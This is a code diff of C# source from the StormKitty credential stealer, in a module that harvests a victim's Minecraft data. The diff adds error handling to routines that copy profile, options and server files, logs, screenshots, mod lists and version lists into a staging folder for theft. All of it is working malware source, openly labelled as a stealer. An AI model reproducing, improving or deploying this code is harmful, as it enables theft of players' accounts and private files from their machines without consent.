@@ -1,4 +1,5 @@
 ﻿using StormKitty;
+using System;
 using System.IO;
 
 namespace Stealer // This shit coded by LimerBoy
@@ -10,60 +11,93 @@ namespace Stealer // This shit coded by LimerBoy
         // Get installed versions
         private static void SaveVersions(string sSavePath)
         {
-            foreach (string version in Directory.GetDirectories(Path.Combine(MinecraftPath, "versions")))
+            try
             {
-                string name = new DirectoryInfo(version).Name;
-                string size = Filemanager.DirectorySize(version) + " bytes";
-                string date = Directory.GetCreationTime(version)
-                    .ToString("yyyy-MM-dd h:mm:ss tt");
+                foreach (string version in Directory.GetDirectories(Path.Combine(MinecraftPath, "versions")))
+                {
+                    string name = new DirectoryInfo(version).Name;
+                    string size = Filemanager.DirectorySize(version) + " bytes";
+                    string date = Directory.GetCreationTime(version)
+                        .ToString("yyyy-MM-dd h:mm:ss tt");
 
-                File.AppendAllText(sSavePath + "\\versions.txt", $"VERSION: {name}\n\tSIZE: {size}\n\tDATE: {date}\n\n");
+                    File.AppendAllText(sSavePath + "\\versions.txt", $"VERSION: {name}\n\tSIZE: {size}\n\tDATE: {date}\n\n");
+                }
             }
+            catch (Exception ex) { Logging.Log("Minecraft >> Failed collect installed versions\n" + ex); }
         }
 
         // Get installed mods
         private static void SaveMods(string sSavePath)
         {
-            foreach (string mod in Directory.GetFiles(Path.Combine(MinecraftPath, "mods")))
+            try
             {
-                string name = Path.GetFileName(mod);
-                string size = new FileInfo(mod).Length + " bytes";
-                string date = File.GetCreationTime(mod)
-                    .ToString("yyyy-MM-dd h:mm:ss tt");
+                foreach (string mod in Directory.GetFiles(Path.Combine(MinecraftPath, "mods")))
+                {
+                    string name = Path.GetFileName(mod);
+                    string size = new FileInfo(mod).Length + " bytes";
+                    string date = File.GetCreationTime(mod)
+                        .ToString("yyyy-MM-dd h:mm:ss tt");
 
-                File.AppendAllText(sSavePath + "\\mods.txt", $"MOD: {name}\n\tSIZE: {size}\n\tDATE: {date}\n\n");
+                    File.AppendAllText(sSavePath + "\\mods.txt", $"MOD: {name}\n\tSIZE: {size}\n\tDATE: {date}\n\n");
+                }
             }
+            catch (Exception ex) { Logging.Log("Minecraft >> Failed collect installed mods\n" + ex); }
         }
 
         // Get screenshots
         private static void SaveScreenshots(string sSavePath)
         {
-            string[] screenshots = Directory.GetFiles(Path.Combine(MinecraftPath, "screenshots"));
-            if (screenshots.Length == 0) return;
-            
-            Directory.CreateDirectory(sSavePath + "\\screenshots");
-            foreach (string screenshot in screenshots)
-                File.Copy(screenshot, sSavePath + "\\screenshots\\" + Path.GetFileName(screenshot));
-        }
-
-        // Get servers
-        private static void SaveServers(string sSavePath)
-        {
-            string servers = Path.Combine(MinecraftPath, "servers.dat");
-            if (!File.Exists(servers)) return;
-            File.Copy(servers, sSavePath + "\\servers.dat");
-        }
-
-        // Get profiles 
-        private static void SaveProfiles(string sSavePath)
-        {
-            string[] files = Directory.GetFiles(MinecraftPath);
-            foreach (string file in files)
+            try
             {
-                FileInfo Profile = new FileInfo(file);
-                if (Profile.Name.ToLower().Contains("profile"))
-                    Profile.CopyTo(Path.Combine(sSavePath, Profile.Name));
+                string[] screenshots = Directory.GetFiles(Path.Combine(MinecraftPath, "screenshots"));
+                if (screenshots.Length == 0) return;
+
+                Directory.CreateDirectory(sSavePath + "\\screenshots");
+                foreach (string screenshot in screenshots)
+                    File.Copy(screenshot, sSavePath + "\\screenshots\\" + Path.GetFileName(screenshot));
             }
+            catch (Exception ex) { Logging.Log("Minecraft >> Failed collect screenshots\n" + ex); }
+        }
+
+        // Get profile & options & servers files 
+        private static void SaveFiles(string sSavePath)
+        {
+            try
+            {
+                string[] files = Directory.GetFiles(MinecraftPath);
+                foreach (string file in files)
+                {
+                    FileInfo File = new FileInfo(file);
+                    string SFile = File.Name.ToLower();
+                    if (SFile.Contains("profile") || SFile.Contains("options") || SFile.Contains("servers"))
+                        File.CopyTo(Path.Combine(sSavePath, File.Name));
+                }
+            }
+            catch (Exception ex) { Logging.Log("Minecraft >> Failed collect profiles\n" + ex); }
+        }
+
+        // Get logs
+        private static void SaveLogs(string sSavePath)
+        {
+            try
+            {
+                string logdir = Path.Combine(MinecraftPath, "logs");
+                string savedir = Path.Combine(sSavePath, "logs");
+                if (!Directory.Exists(logdir)) return;
+                Directory.CreateDirectory(savedir);
+                string[] files = Directory.GetFiles(logdir);
+                foreach (string file in files)
+                {
+                    FileInfo File = new FileInfo(file);
+                    if (File.Length < Config.GrabberSizeLimit)
+                    {
+                        string to = Path.Combine(savedir, File.Name);
+                        if (!System.IO.File.Exists(to))
+                            File.CopyTo(to);
+                    }
+                }
+            }
+            catch (Exception ex) { Logging.Log("Minecraft >> Failed collect logs\n" + ex); }
         }
 
         // Run minecraft data stealer
@@ -74,13 +108,13 @@ namespace Stealer // This shit coded by LimerBoy
             try
             {
                 Directory.CreateDirectory(sSavePath);
-                SaveProfiles(sSavePath);
-                SaveServers(sSavePath);
-                SaveScreenshots(sSavePath);
                 SaveMods(sSavePath);
+                SaveLogs(sSavePath);
+                SaveFiles(sSavePath);
                 SaveVersions(sSavePath);
+                SaveScreenshots(sSavePath);
             }
-            catch { }
+            catch (Exception ex) { Logging.Log("Minecraft >> Failed collect data\n" + ex); }
         }
 
 
